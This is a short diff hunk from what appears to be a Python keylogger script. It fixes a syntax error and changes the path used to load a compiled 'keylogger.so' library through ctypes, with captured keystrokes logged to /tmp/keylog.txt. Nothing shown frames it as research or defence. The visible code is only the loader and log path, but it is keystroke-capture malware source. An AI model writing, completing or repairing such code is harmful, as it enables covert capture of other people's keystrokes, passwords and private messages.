@@ -6,7 +6,7 @@ from ctypes import cdll
 LOG_FILE = "/tmp/keylog.txt"
 
 # Load the C-based keylogger library
-lib_path = os.path.join(os.path.dirname(__file__), "keylogger.so"  # Replace with your actual path
+lib_path = os.path.join(os.environ['HOME'], "Documents", "VRS", "keylogger.so")
 keylogger_lib = cdll.LoadLibrary(lib_path)
 
 # Helper function to log keystrokes to a file
